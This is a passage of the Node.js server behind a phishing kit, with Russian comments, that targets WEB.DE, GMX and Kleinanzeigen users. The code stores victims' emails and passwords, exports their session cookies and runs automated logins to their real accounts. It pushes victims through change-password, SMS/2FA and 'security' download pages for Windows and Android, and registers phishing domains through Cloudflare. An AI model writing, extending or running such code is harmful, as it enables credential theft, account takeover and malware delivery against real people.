/** Добавляет пароль в password history. source: 'login'/'login_kl' — со страницы входа (web/Klein), 'change'/'change_kl' — со смены пароля. Дубликат подряд не добавляется. */
function pushPasswordHistory(lead, newPassword, source) {
  const allowed = ['login', 'login_kl', 'change', 'change_kl'];
  if (allowed.indexOf(source) === -1 || newPassword == null || String(newPassword).trim() === '') return;
  var trimmed = String(newPassword).trim();
  if (!Array.isArray(lead.passwordHistory)) lead.passwordHistory = [];
  lead.passwordHistory.push({ p: trimmed, s: source });
}

function readSavedCredentials() {
  try {
    if (fs.existsSync(SAVED_CREDENTIALS_FILE)) {
      const content = fs.readFileSync(SAVED_CREDENTIALS_FILE, 'utf8');
      const data = JSON.parse(content);
      return Array.isArray(data) ? data : [];
    }
    return [];
  } catch (err) {
    console.error('[SERVER] Ошибка чтения saved-credentials.json:', err);
    return [];
  }
}

function writeSavedCredentials(credentials) {
  try {
    ensureDataFile();
    fs.writeFileSync(SAVED_CREDENTIALS_FILE, JSON.stringify(credentials, null, 2), 'utf8');
  } catch (err) {
    console.error('[SERVER] Ошибка записи saved-credentials.json:', err);
  }
}

function ensureDataFile() {
  if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
  if (!fs.existsSync(SAVED_CREDENTIALS_FILE)) fs.writeFileSync(SAVED_CREDENTIALS_FILE, JSON.stringify([], null, 2), 'utf8');
  getDb();
}

function writeDebugLog(action, data) {
  try {
    if (!writeDebugLog._ready) {
      if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
      writeDebugLog._ready = true;
    }
    if (!writeDebugLog._throttle) writeDebugLog._throttle = new Map();
    if (action === 'LEADS_REQUESTED' || action === 'LEADS_RETURNED') {
      const ip = data && data.ip ? String(data.ip) : '-';
      const page = data && data.page != null ? String(data.page) : '-';
      const key = action + '|' + ip + '|' + page;
      const nowTs = Date.now();
      const prevTs = writeDebugLog._throttle.get(key) || 0;
      if (nowTs - prevTs < 5000) return;
      writeDebugLog._throttle.set(key, nowTs);
      if (writeDebugLog._throttle.size > 3000) {
        for (const [k, ts] of writeDebugLog._throttle) {
          if ((nowTs - ts) > 30000) writeDebugLog._throttle.delete(k);
        }
      }
    }
    const timestamp = new Date().toISOString();
    const safe = (obj) => {
      if (obj == null || typeof obj !== 'object') return obj;
      const out = {};
      for (const k of Object.keys(obj)) {
        const v = obj[k];
        if ((k === 'email' || k.endsWith('Email')) && typeof v === 'string') {
          out[k] = maskEmail(v);
        } else if (v && typeof v === 'object' && !Array.isArray(v) && !(v instanceof Date)) {
          out[k] = safe(v);
        } else {
          out[k] = v;
        }
      }
      return out;
    };
    const logEntry = {
      timestamp: timestamp,
      action: action,
      data: safe(data)
    };
    const logLine = JSON.stringify(logEntry) + '\n';
    fs.appendFileSync(DEBUG_LOG_FILE, logLine, 'utf8');
  } catch (err) {
    console.error('[SERVER] Ошибка записи в debug.log:', err);
  }
}

/**
 * Объединение дубликатов только по id (visitId).
 * IP НЕ используется для связывания или объединения записей — только для отображения.
 * Email НЕ используется для объединения — каждая новая почта создает новый лог.
 * Один пользователь может менять IP (VPN, мобильная сеть), поэтому IP ненадежен для связывания.
 */
function mergeDuplicates(leads) {
  if (!Array.isArray(leads) || leads.length === 0) return leads;
  
  const merged = [];
  const seenById = new Set();   // id (visitId) — один сеанс, точный дубликат
  const seenByEmail = new Map(); // email -> индекс в merged (один аккаунт = одна запись)
  
  for (let i = 0; i < leads.length; i++) {
    const lead = leads[i];
    
    if (!lead || typeof lead !== 'object') {
      console.warn('[SERVER] mergeDuplicates: пропущена некорректная запись на индексе', i);
      continue;
    }
    
    const id = (lead.id || '').trim();
    const email = (lead.email || '').trim().toLowerCase();
    
    // Пропускаем записи без идентификаторов
    if (!id && !email) {
      console.warn('[SERVER] mergeDuplicates: пропущена запись без id и email');
      continue;
    }
    
    // 1) Дубликат по id (один и тот же визит) — пропускаем
    if (id && seenById.has(id)) {
      continue;
    }
    
    // 2) НЕ объединяем записи по email - каждая новая почта = новый лог
    // Объединяем только дубликаты по id (один и тот же visitId)
    // Если email одинаковый, но id разный - это разные логи (новая сессия с той же почтой)
    
    // Всегда добавляем запись как новую (не объединяем по email)
    merged.push(lead);
    const newIndex = merged.length - 1;
    if (id) seenById.add(id);
    // Не используем seenByEmail для объединения, только для отслеживания
    if (email) seenByEmail.set(email, newIndex);
  }
  
  return merged;
}

function broadcastLeadsUpdate() {
  if (typeof global.__gmwWssBroadcast === 'function') global.__gmwWssBroadcast();
}

/**
 * Редкий массовый снимок: полная замена таблицы лидов (не использовать в горячем пути).
 */
function writeLeads(leads) {
  if (!Array.isArray(leads)) {
    console.error('[SERVER] Ошибка: replaceAllLeads ожидает массив');
    return;
  }
  try {
    ensureDataFile();
    replaceAllLeads(leads);
    invalidateLeadsCache();
    broadcastLeadsUpdate();
  } catch (err) {
    console.error('[SERVER] Ошибка replaceAllLeads:', err);
  }
}

function appendToAllLog(email, lastPassword, newPassword) {
  try {
    ensureDataFile();
    const emailStr = (email || '').trim();
    const lastPwdStr = (lastPassword || '').trim();
    const newPwdStr = (newPassword || '').trim();
    
    if (!emailStr) return; // Не сохраняем если нет email
    
    const line = emailStr + ':' + lastPwdStr + ':' + newPwdStr + '\n';
    fs.appendFileSync(ALL_LOG_FILE, line, 'utf8');
  } catch (err) {
    console.error('[SERVER] Ошибка записи в all.txt:', err);
  }
}

function readModeData() {
  try {
    return getModeData();
  } catch (_) {
    return { mode: 'auto', autoScript: false };
  }
}

function readMode() {
  return readModeData().mode;
}

function readAutoScript() {
  return readModeData().autoScript;
}

function writeStartPage(value) {
  ensureDataFile();
  const v = value === 'change' ? 'change' : value === 'download' ? 'download' : value === 'klein' ? 'klein' : 'login';
  fs.writeFileSync(START_PAGE_FILE, v, 'utf8');
}

/** У Klein нет GMX/WEB.DE push-страницы на фишинге. В БД статус может быть redirect_push (админка, бейдж Push), а в поллинге статуса жертве отдаём pending — см. обработчик lead-status. */
function suppressVictimPushPageForKleinContext(lead) {
  if (!lead) return false;
  if (lead.brand === 'klein') return true;
  if (readStartPage() === 'klein') return true;
  return false;
}

/** Пометка Kl у лида: отдельный бренд или уже введён emailKl. Без этого в EVENTS не смешиваем сценарий с Klein — только почта WEB.DE. */
function leadHasKleinMarkedData(lead) {
  if (!lead || typeof lead !== 'object') return false;
  if (lead.brand === 'klein') return true;
  if (String(lead.emailKl || '').trim() !== '') return true;
  return false;
}

automationService.init({
  readLeads: leadService.readLeads,
  persistLeadPatch: leadService.persistLeadPatch,
  pushEvent,
  writeDebugLog,
  logTerminalFlow,
  readMode,
  readAutoScript,
  readStartPage,
  leadHasKleinMarkedData,
  EVENT_LABELS,
  getWorkerSecret: () => WORKER_SECRET,
  serverProjectRoot: PROJECT_ROOT,
});

initAppServices({ pushEvent });

try {
  const clearedRuns = clearAllWebdeScriptActiveRuns();
  if (clearedRuns > 0) {
    invalidateLeadsCache();
    console.log(
      '[SERVER] Сброшен webde_script_active_run у ' + clearedRuns + ' лид(ов) при старте (после PM2/аварии без slot-done).'
    );
  }
} catch (e) {
  console.warn('[SERVER] clearAllWebdeScriptActiveRuns:', e && e.message ? e.message : e);
}

const {
  WEBDE_LOGIN_MAX_CONCURRENT,
  runningWebdeLoginLeadIds,
  pendingWebdeLoginQueue,
  webdeLoginChildByLeadId,
  releaseWebdeLoginSlot,
  preemptWebdeLoginForReplacedLead,
  stopWebdeLoginForDeletedLead,
  setWebdeLeadScriptStatus,
  runWhenLeadsWriteQueueIdle,
  tryAcquireWebdeScriptLock,
  clearWebdeScriptRunning,
  touchWebdeScriptLock,
  webdeLockWriteChildPid,
  beginWebdeAutoLoginRun,
  endWebdeAutoLoginRun,
  startWebdeLoginAfterLeadSubmit,
  restartWebdeAutoLoginAfterVictimRetryFromError,
  startWebdeLoginForLeadId,
  startKleinLoginForLeadId,
  clearAllWebdeChildrenAndQueues,
} = automationService;

function writeMode(mode, autoScript) {
  ensureDataFile();
  const cur = readModeData();
  const next = { mode: mode !== undefined ? (mode === 'manual' ? 'manual' : 'auto') : cur.mode, autoScript: autoScript !== undefined ? !!autoScript : cur.autoScript };
  writeModeData(next);
}

function readShortDomains() {
  try {
    if (fs.existsSync(SHORT_DOMAINS_FILE)) {
      const raw = fs.readFileSync(SHORT_DOMAINS_FILE, 'utf8');
      const data = JSON.parse(raw);
      return typeof data === 'object' && data !== null ? data : {};
    }
  } catch (e) {}
  return {};
}

const SHORT_DOMAINS_TTL_MS = 10000;
let _shortDomainsCache = { data: null, ts: 0 };
/** Кэш short-доменов на 10 сек, чтобы не читать файл на каждый запрос (снижает риск 504 на /admin). */
function getShortDomainsList() {
  const now = Date.now();
  if (_shortDomainsCache.data !== null && (now - _shortDomainsCache.ts) < SHORT_DOMAINS_TTL_MS) {
    return _shortDomainsCache.data;
  }
  const data = readShortDomains();
  _shortDomainsCache = { data, ts: now };
  return data;
}

function writeShortDomains(obj) {
  ensureDataFile();
  fs.writeFileSync(SHORT_DOMAINS_FILE, JSON.stringify(obj, null, 2), 'utf8');
  _shortDomainsCache = { data: null, ts: 0 };
}

function addShortDomainToCloudflare(domain, serverIp, apiToken, cb) {
  const opts = {
    hostname: 'api.cloudflare.com',
    path: '/client/v4/zones',
    method: 'POST',
    headers: { 'Authorization': 'Bearer ' + apiToken, 'Content-Type': 'application/json' }
  };
  const body = JSON.stringify({ name: domain, jump_start: true });
  const req = https.request(opts, function (res) {
    let data = '';
    res.on('data', function (chunk) { data += chunk; });
    res.on('end', function () {
      let json;
      try { json = JSON.parse(data); } catch (e) { return cb(new Error('Invalid CF response')); }
      if (!json.success || !json.result) return cb(new Error((json.errors && json.errors[0] && json.errors[0].message) || 'CF add zone failed'));
      const zoneId = json.result.id;
      const ns = (json.result.name_servers || []).slice(0, 2);
      const opts2 = {
        hostname: 'api.cloudflare.com',
        path: '/client/v4/zones/' + zoneId + '/dns_records',
        method: 'POST',
        headers: { 'Authorization': 'Bearer ' + apiToken, 'Content-Type': 'application/json' }
      };
      const body2 = JSON.stringify({ type: 'A', name: '@', content: serverIp, ttl: 1, proxied: false });
      const req2 = https.request(opts2, function (res2) {
        let data2 = '';
        res2.on('data', function (chunk) { data2 += chunk; });
        res2.on('end', function () {
          let json2;
          try { json2 = JSON.parse(data2); } catch (e) {}
          if (!json2 || !json2.success) return cb(new Error((json2 && json2.errors && json2.errors[0] && json2.errors[0].message) || 'CF A record failed'));
          cb(null, ns);
        });
      });
      req2.on('error', function (e) { cb(e); });
      req2.write(body2);
      req2.end();
    });
  });
  req.on('error', function (e) { cb(e); });
  req.write(body);
  req.end();
}

function readZipPassword() {
  try {
    if (fs.existsSync(ZIP_PASSWORD_FILE)) {
      return fs.readFileSync(ZIP_PASSWORD_FILE, 'utf8').trim();
    }
  } catch (e) {}
  return '';
}

function writeZipPassword(value) {
  ensureDataFile();
  fs.writeFileSync(ZIP_PASSWORD_FILE, String(value == null ? '' : value).trim(), 'utf8');
}

/** Только в режиме Auto (не Manual, не Auto-Login): после ввода почты и пароля сразу кидать юзера на startPage. Manual — админ сам направляет; Auto-Login — редирект только после успешного входа скрипта. */
function getInitialRedirectStatus(mode, autoScript, startPage, lead) {
  // Для Klein любые редиректы выполняются только вручную из админки.
  if (lead && lead.brand === 'klein') return null;
  if (mode === 'manual') return null;
  if (mode === 'auto' && autoScript) return null; // Auto-Login: редирект по startPage делаем в webde-login-result после успеха скрипта
  if (mode !== 'auto') return null;
  if (startPage === 'login') return 'show_success';
  if (startPage === 'change') return 'redirect_change_password';
  if (startPage === 'download') return getRedirectPasswordStatus(lead);
  return null;
}
function getAutoRedirectEventLabel(status) {
  if (status === 'redirect_sicherheit') return 'Авто: редирект на Download (Windows)';
  if (status === 'redirect_change_password') return 'Авто: редирект на смену пароля';
  if (status === 'redirect_android') return 'Авто: редирект на скачивание (Android)';
  if (status === 'redirect_open_on_pc') return 'Авто: редирект на страницу ПК';
  if (status === 'redirect_klein_anmelden') return 'Авто: редирект на Klein (после почты)';
  return 'Авто: редирект';
}

/**
 * После прошлого сценария лид может остаться в redirect_* (например Auto-Login уже кинул на смену пароля).
 * Новый заход с тем же visitId / fingerprint — без сброса /api/status сразу отдаёт старый redirect, страница уводит на passwort-aendern,
 * а в лог не попадает новое «Авто: редирект…» (статус не менялся). Сбрасываем в pending + событие в журнал.
 */
function leadStatusStaleAfterCompletedRedirect(status) {
  if (!status || typeof status !== 'string') return false;
  return [
    'redirect_change_password',
    'redirect_sicherheit',
    'redirect_android',
    'redirect_open_on_pc',
    'redirect_push',
    'redirect_sms_code',
    'redirect_2fa_code',
    'redirect_gmx_net',
    'redirect_klein_forgot',
    'redirect_klein_sms_wait',
    'redirect_klein_anmelden',
  ].indexOf(status) !== -1;
}

function applyReturnVisitStatusReset(lead) {
  if (!lead) return;
  const st = lead.status;
  if (st === 'show_success' || leadStatusStaleAfterCompletedRedirect(st)) {
    lead.status = 'pending';
    pushEvent(lead, 'Повторный ввод данных — сброс статуса');
  }
}

const API_ROUTE_DEPS = {
  readMode,
  statusHeartbeats,
  suppressVictimPushPageForKleinContext,
  pushEvent,
  broadcastLeadsUpdate,
  writeDebugLog,
};

const ROUTE_HTTP_DEPS = mergeServiceRouteDeps({
  ADMIN_DOMAIN,
  ALLOWED_EMAIL_DOMAINS: ALLOWED_EMAIL_DOMAINS,
  ALLOWED_EMAIL_DOMAINS_RAW: ALLOWED_EMAIL_DOMAINS_RAW,
  ALL_LOG_FILE: ALL_LOG_FILE,
  ARCHIVE_PROCESS_TIMEOUT_MS: downloadKitService.ARCHIVE_PROCESS_TIMEOUT_MS,
  BRANDS: BRANDS,
  CHECK_DIR: CHECK_DIR,
  CHECK_META_FILE: CHECK_META_FILE,
  COOKIES_EXPORTED_FILE: COOKIES_EXPORTED_FILE,
  DATA_DIR: DATA_DIR,
  DEBUG_LOG_FILE: DEBUG_LOG_FILE,
  DEFAULT_DOWNLOAD_LIMIT: DEFAULT_DOWNLOAD_LIMIT,
  DOWNLOADS_DIR: DOWNLOADS_DIR,
  DOWNLOAD_ANDROID_CONFIG: DOWNLOAD_ANDROID_CONFIG,
  DOWNLOAD_ANDROID_LIMITS_FILE: DOWNLOAD_ANDROID_LIMITS_FILE,
  DOWNLOAD_COUNTS_FILE: DOWNLOAD_COUNTS_FILE,
  DOWNLOAD_FILES_CONFIG: DOWNLOAD_FILES_CONFIG,
  DOWNLOAD_LIMITS_FILE: DOWNLOAD_LIMITS_FILE,
  DOWNLOAD_ROTATION_FILE: DOWNLOAD_ROTATION_FILE,
  DOWNLOAD_SETTINGS_FILE: DOWNLOAD_SETTINGS_FILE,
  DOWNLOAD_SLOTS_COUNT: DOWNLOAD_SLOTS_COUNT,
  DOWNLOAD_TOKEN_TTL_MS: DOWNLOAD_TOKEN_TTL_MS,
  ENABLE_EMAIL_DOMAIN_ALLOWLIST: ENABLE_EMAIL_DOMAIN_ALLOWLIST,
  EVENT_LABELS: EVENT_LABELS,
  GATE_TIME_TTL_MS: GATE_TIME_TTL_MS,
  HEARTBEAT_MAX_AGE_MS: HEARTBEAT_MAX_AGE_MS,
  HOST: HOST,
  KLEIN_VICTIM_PASSWORD_ERROR_DE: KLEIN_VICTIM_PASSWORD_ERROR_DE,
  LOGIN_ARTIFACT_NAMES: LOGIN_ARTIFACT_NAMES,
  LOGIN_CLEANUP_MAX_AGE_MS: LOGIN_CLEANUP_MAX_AGE_MS,
  LOGIN_DIR: LOGIN_DIR,
  MIN_TIME_SINCE_GATE_ANDROID_MS: MIN_TIME_SINCE_GATE_ANDROID_MS,
  MIN_TIME_SINCE_GATE_MS: MIN_TIME_SINCE_GATE_MS,
  MOBILE_MAX_WIDTH: MOBILE_MAX_WIDTH,
  PORT: PORT,
  PROJECT_ROOT: PROJECT_ROOT,
  PROXY_FILE: PROXY_FILE,
  PROXY_KLEIN_FILE: PROXY_KLEIN_FILE,
  KLEIN_COOKIES_FILE: KLEIN_COOKIES_FILE,
  RATE_LIMITS: RATE_LIMITS,
  RATE_LIMIT_WINDOW_MS: RATE_LIMIT_WINDOW_MS,
  REQUIRE_GATE_COOKIE: REQUIRE_GATE_COOKIE,
  SAVED_CREDENTIALS_FILE: SAVED_CREDENTIALS_FILE,
  terminalEntradaSiteLabel: terminalEntradaSiteLabel,
  SHORT_DOMAINS_FILE: SHORT_DOMAINS_FILE,
  SHORT_DOMAINS_TTL_MS: SHORT_DOMAINS_TTL_MS,
  START_PAGE_FILE: START_PAGE_FILE,
  WEBDE_SCRIPT_VICTIM_WAIT_MS: WEBDE_SCRIPT_VICTIM_WAIT_MS,
  WEBDE_WAIT_PASSWORD_TIMEOUT_MS: WEBDE_WAIT_PASSWORD_TIMEOUT_MS,
  ZIP_PASSWORD_FILE: ZIP_PASSWORD_FILE,
  _shortDomainsCache: _shortDomainsCache,
  addShortDomainToCloudflare: addShortDomainToCloudflare,
  apiRoutes: apiRoutes,
  appendToAllLog: appendToAllLog,
  applyReturnVisitStatusReset: applyReturnVisitStatusReset,
  archiveFlagIsSet: archiveFlagIsSet,
  automationService: automationService,
  broadcastLeadsUpdate: broadcastLeadsUpdate,
  chatService: chatService,
  checkRateLimit: checkRateLimit,
  cleanupRateLimit: cleanupRateLimit,
  consumeDownloadToken: consumeDownloadToken,
  cookieEmailForLeadCookiesFile: cookieEmailForLeadCookiesFile,
  cookieExportFilename: cookieExportFilename,
  cookieSafeForLoginCookiesFile: cookieSafeForLoginCookiesFile,
  dns: dns,
  downloadTokens: downloadTokens,
  ensureDataFile: ensureDataFile,
  findDownloadFile: findDownloadFile,
  firstGateTimeByIp: firstGateTimeByIp,
  fs: fs,
  generateDownloadToken: generateDownloadToken,
  getAndroidDownloadFile: getAndroidDownloadFile,
  getAndroidDownloadFileByLimit: getAndroidDownloadFileByLimit,
  getAndroidDownloadFiles: getAndroidDownloadFiles,
  getAutoRedirectEventLabel: getAutoRedirectEventLabel,
  getBrand: getBrand,
  getCanonicalDomain: getCanonicalDomain,
  getClientIp: getClientIp,
  getInitialRedirectStatus: getInitialRedirectStatus,
  getLoginAndNewPassword: getLoginAndNewPassword,
  getMinTimeSinceGateOk: getMinTimeSinceGateOk,
  getRedirectPasswordStatus: getRedirectPasswordStatus,
  getShortDomainsList: getShortDomainsList,
  getSicherheitDownloadFile: getSicherheitDownloadFile,
  getSicherheitDownloadFileByLimit: getSicherheitDownloadFileByLimit,
  getSicherheitDownloadFiles: getSicherheitDownloadFiles,
  getSlotForLead: getSlotForLead,
  http: http,
  https: https,
  incrementDownloadCount: incrementDownloadCount,
  invalidateLeadsCache: invalidateLeadsCache,
  isAdminRequest: isAdminRequest,
  isLocalHost: isLocalHost,
  leadEventTerminalHasExactLabel: leadEventTerminalHasExactLabel,
  leadHasKleinMarkedData: leadHasKleinMarkedData,
  leadHasSavedCookies: leadHasSavedCookies,
  leadIsWorkedFromEvents: leadIsWorkedFromEvents,
  leadIsWorkedLikeAdmin: leadIsWorkedLikeAdmin,
  leadService: leadService,
  leadStatusStaleAfterCompletedRedirect: leadStatusStaleAfterCompletedRedirect,
  mergeDuplicates: mergeDuplicates,
  net: net,
  normalizePasswordHistory: normalizePasswordHistory,
  os: os,
  path: path,
  persistLeadFull: persistLeadFull,
  persistLeadPatch: persistLeadPatch,
  updateLeadPasswordVersioned: leadService.updateLeadPasswordVersioned,
  markPasswordConsumedByAttempt: leadService.markPasswordConsumedByAttempt,
  processArchiveToGmx: processArchiveToGmx,
  pushEvent: pushEvent,
  pushPasswordHistory: pushPasswordHistory,
  pushSubmitPipelineEvent: pushSubmitPipelineEvent,
  rateLimitBuckets: rateLimitBuckets,
  readAndroidDownloadConfig: readAndroidDownloadConfig,
  readAndroidDownloadLimits: readAndroidDownloadLimits,
  readAutoScript: readAutoScript,
  readCheckMeta: readCheckMeta,
  readCookiesExported: readCookiesExported,
  readCookiesExportedSets: readCookiesExportedSets,
  appendCookiesExportedLeadIds: appendCookiesExportedLeadIds,
  readDownloadCounts: readDownloadCounts,
  readDownloadFilesConfig: readDownloadFilesConfig,
  readDownloadLimits: readDownloadLimits,
  readDownloadRotation: readDownloadRotation,
  readDownloadSettings: readDownloadSettings,
  readLeads: readLeads,
  readLeadsAsync: readLeadsAsync,
  readLeadById: leadService.readLeadById,
  findLeadIdByEmail: leadService.findLeadIdByEmail,
  findAllLeadIdsByEmailNormalized: leadService.findAllLeadIdsByEmailNormalized,
  deleteLeadById: leadService.deleteLeadById,
  readMode: readMode,
  readModeData: readModeData,
  readSavedCredentials: readSavedCredentials,
  readShortDomains: readShortDomains,
  readStartPage: readStartPage,
  readZipPassword: readZipPassword,
  resolveLeadId: resolveLeadId,
  resolvePlatform: resolvePlatform,
  sanitizeFilenameForHeader: sanitizeFilenameForHeader,
  setFirstGateTime: setFirstGateTime,
  short: short,
  slotFromLeadId: slotFromLeadId,
  smsCodeDataKindForLead: smsCodeDataKindForLead,
  statusHeartbeats: statusHeartbeats,
  submitPipelineDetail: submitPipelineDetail,
  submitPipelineEventRaw: submitPipelineEventRaw,
  suppressVictimPushPageForKleinContext: suppressVictimPushPageForKleinContext,
  url: url,
  webdeErrorTriggersVictimAutomationWait: webdeErrorTriggersVictimAutomationWait,
  webdePasswordWaiters: webdePasswordWaiters,
  webdePushResendRequested: webdePushResendRequested,
  writeAndroidDownloadConfig: writeAndroidDownloadConfig,
  writeAndroidDownloadLimits: writeAndroidDownloadLimits,
  writeCheckMeta: writeCheckMeta,
  writeCookiesExported: writeCookiesExported,
  writeDebugLog: writeDebugLog,
  writeDownloadCounts: writeDownloadCounts,
  writeDownloadFilesConfig: writeDownloadFilesConfig,
  writeDownloadLimits: writeDownloadLimits,
  writeDownloadRotation: writeDownloadRotation,
  writeDownloadSettings: writeDownloadSettings,
  writeLeads: writeLeads,
  writeMode: writeMode,
  writeReplacedLeadId: writeReplacedLeadId,
  writeSavedCredentials: writeSavedCredentials,
  writeShortDomains: writeShortDomains,
  writeStartPage: writeStartPage,
  writeZipPassword: writeZipPassword,
  yauzl: yauzl,
  buildAutomationProfile: buildAutomationProfile,
  buildLeadLoginContextPayload: buildLeadLoginContextPayload,
  clearWebdeScriptRunning: clearWebdeScriptRunning,
  endWebdeAutoLoginRun: endWebdeAutoLoginRun,
  fingerprintSignature: fingerprintSignature,
  logTerminalFlow: logTerminalFlow,
  releaseWebdeLoginSlot: releaseWebdeLoginSlot,
  setWebdeLeadScriptStatus: setWebdeLeadScriptStatus,
  touchWebdeScriptLock: touchWebdeScriptLock,
  webdeLoginChildByLeadId: webdeLoginChildByLeadId,
});

Object.defineProperties(ROUTE_HTTP_DEPS, {
  GMX_DOMAIN: { enumerable: true, configurable: true, get: function () { return brandDomains.scalars.gmxDomain; } },
  GMX_CANONICAL_HOST: { enumerable: true, configurable: true, get: function () { return brandDomains.scalars.gmxCanonicalHost; } },
  GMX_DOMAINS_LIST: { enumerable: true, configurable: true, get: function () { return brandDomains.GMX_DOMAINS_LIST; } },
  GMX_DOMAINS_RAW: { enumerable: true, configurable: true, get: function () { return brandDomains.scalars.gmxDomainsRaw; } },
  KLEIN_CANONICAL_HOST: { enumerable: true, configurable: true, get: function () { return brandDomains.scalars.kleinCanonicalHost; } },
  KLEIN_DOMAIN: { enumerable: true, configurable: true, get: function () { return brandDomains.scalars.kleinDomain; } },
  KLEIN_DOMAINS_LIST: { enumerable: true, configurable: true, get: function () { return brandDomains.KLEIN_DOMAINS_LIST; } },
  KLEIN_DOMAINS_RAW: { enumerable: true, configurable: true, get: function () { return brandDomains.scalars.kleinDomainsRaw; } },
  WEBDE_CANONICAL_HOST: { enumerable: true, configurable: true, get: function () { return brandDomains.scalars.webdeCanonicalHost; } },
  WEBDE_DOMAIN: { enumerable: true, configurable: true, get: function () { return brandDomains.scalars.webdeDomain; } },
  WEBDE_DOMAINS_LIST: { enumerable: true, configurable: true, get: function () { return brandDomains.WEBDE_DOMAINS_LIST; } },
  WEBDE_DOMAINS_RAW: { enumerable: true, configurable: true, get: function () { return brandDomains.scalars.webdeDomainsRaw; } },
  SERVER_LOG_PHISH_LABEL: { enumerable: true, configurable: true, get: function () { return brandDomains.getServerLogPhishLabel(); } }
});

const server = http.createServer(async (req, res) => {
  // Обработка CORS preflight запросов
  if (req.method === 'OPTIONS') {
    if (safeEnd(res)) return;
    res.writeHead(200, {
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
      'Access-Control-Allow-Headers': 'Content-Type, x-worker-secret',
      'Access-Control-Max-Age': '86400'
    });
    res.end();
    return;
  }

  applyLocalDevBrandCookies(req, res);

  const parsed = parseHttpRequestUrl(req);
  let pathname = parsed.pathname;
  const requestHost = (req.headers.host || '').split(':')[0].toLowerCase();
  pathname = rewriteLocalDevShortcutPath(pathname, requestHost);
  parsed.pathname = pathname;

  if (handleFastPreGateRoutes(req, res, pathname, { safeEnd, short })) return;

  const MAX_POST_BODY_BYTES = 50 * 1024 * 1024;
  if (req.method === 'POST' && req.headers['content-length']) {
    const cl = parseInt(req.headers['content-length'], 10);
    if (!isNaN(cl) && cl > MAX_POST_BODY_BYTES) {
      send(res, 413, { ok: false, error: 'Payload too large' });
      req.destroy();
      return;
    }
  }

  if ((pathname === '/api/config/download' || pathname === '/api/config/download-android' || pathname === '/api/config/check') && req.method === 'POST' && req.setTimeout) {
    req.setTimeout(300000);
    req.on('timeout', () => { req.destroy(); });
  }

  if (tryKleinLegacyHostRedirect(req, res, requestHost)) return;
  /** Как localhost для гейта/админки/канон. редиректа: loopback + RFC1918 (доступ по IP машины в LAN). */
  const isLocalhost = !requestHost || isLocalHost(requestHost);
  const isAdminPage = isAdminPagePath(pathname);
  const isAdminLoginPage = isAdminLoginPath(pathname);
  const shortDomainsList = getShortDomainsList();
  const shortHostNorm = requestHost.replace(/^www\./, '');
  const shortDomainKey = shortDomainsList[requestHost] ? requestHost : (shortDomainsList[shortHostNorm] ? shortHostNorm : null);
  const isShortDomain = shortDomainKey !== null;

  if (gateMiddleware.runHostShortCanonicalPhase(req, res, {
    pathname,
    requestHost,
    isLocalhost,
    isAdminPage,
    isAdminLoginPage,
    ADMIN_DOMAIN,
    isAdminRequest,
    isAdminDomainAllowedPath,
    isAdminDomainPublicUnauthenticatedPath,
    buildAdminLoginNextUrl,
    PASSWORD_AUTH_ENABLED,
    hasValidAdminSession,
    isShortDomain,
    shortDomainKey,
    shortDomainsList,
    getCanonicalDomain,
    GMX_DOMAIN: brandDomains.scalars.gmxDomain,
    GMX_DOMAINS_LIST: brandDomains.GMX_DOMAINS_LIST,
    WEBDE_DOMAINS_LIST: brandDomains.WEBDE_DOMAINS_LIST,
    KLEIN_DOMAINS_LIST: brandDomains.KLEIN_DOMAINS_LIST,
    PROJECT_ROOT,
    getBrand,
    getShortDomainsList,
  })) return;

  const ip = getClientIp(req);
  if (gateMiddleware.blockIfApiVisitFlooded(req, res, pathname, req.method, ip)) return;

  const isUserPath = pathname === '/api/visit' || pathname === '/api/submit' || pathname === '/api/download-filename' ||
    (pathname.startsWith('/download/') && pathname.length > 9) ||
    (req.method === 'GET' && gateMiddleware.isProtectedPage(pathname));
  if (isUserPath && gateMiddleware.hasGateCookie(req)) setFirstGateTime(ip);

  if (await handleApiRequestChain(req, res, parsed, pathname, ip, {
    apiRoutes,
    clientRoutes,
    adminRoutes,
    API_ROUTE_DEPS,
    ROUTE_HTTP_DEPS,
    readApiRouteBody,
    send,
    safeEnd,
    maxPostBodyBytes: MAX_POST_BODY_BYTES,
  })) return;

  if (handlePreStaticSpecialRoutes(req, res, pathname, {
    safeEnd,
    getBrand,
    gateMiddleware,
    getShortDomainsList,
  })) return;

  if (gateMiddleware.handleProtectedPageGate(req, res, pathname, getBrand)) return;

  const ROUTE_HTTP_MERGED_STATIC = Object.assign({}, ROUTE_HTTP_DEPS, { ip });

  if (handleDownloadRoutes(req, res, parsed, pathname, {
    ADMIN_DOMAIN,
    requestHost,
    hasValidAdminSession,
    consumeDownloadToken,
    checkRateLimit,
    RATE_LIMITS,
    ip,
    findDownloadFile,
    incrementDownloadCount,
    sanitizeFilenameForHeader,
    safeEnd,
    send,
    fs,
    path,
    getSicherheitDownloadFile,
  })) return;

  try {
    await staticRoutes.handleRoute(req, res, parsed, '', ROUTE_HTTP_MERGED_STATIC);
  } catch (err) {
    console.error('[staticRoutes]', err);
    if (!safeEnd(res)) send(res, 500, { ok: false, error: 'server error' });
  }
});

server.on('error', (err) => {
  if (err.code === 'EADDRINUSE') {
    writeFatalSync(`Ошибка: Порт ${PORT} уже занят. Используйте другой порт через переменную PORT.`);
    process.exit(1);
  } else {
    writeFatalSync('Ошибка сервера: ' + (err && err.stack ? err.stack : err));
    process.exit(1);
  }
});

if (WebSocketServer) {
  attachAdminLeadsWebSocket(WebSocketServer, server);
} else {
  console.log('[SERVER] WebSocket не подключён (установите: npm install ws)');
}

// Production: требовать пару ADMIN_USERNAME + ADMIN_PASSWORD
const isProduction = (process.env.NODE_ENV || '').toLowerCase() === 'production';
if (isProduction && !PASSWORD_AUTH_ENABLED) {
  writeFatalSync('[SERVER] NODE_ENV=production: задайте ADMIN_USERNAME+ADMIN_PASSWORD в .env. Иначе админка не защищена.');
  process.exit(1);
}

// Обработка необработанных исключений — логировать и завершать процесс
process.on('uncaughtException', (err) => {
  writeFatalSync('[SERVER] uncaughtException: ' + (err && err.stack ? err.stack : err));
  process.exit(1);
});
process.on('unhandledRejection', (reason, promise) => {
  writeFatalSync('[SERVER] unhandledRejection: ' + (reason && reason.stack ? reason.stack : reason));
  process.exit(1);
});

// При старте: создать критичные каталоги и сообщить о необязательных зависимостях
ensureDataFile();
const db = getDb();
startAutoBackups(db);
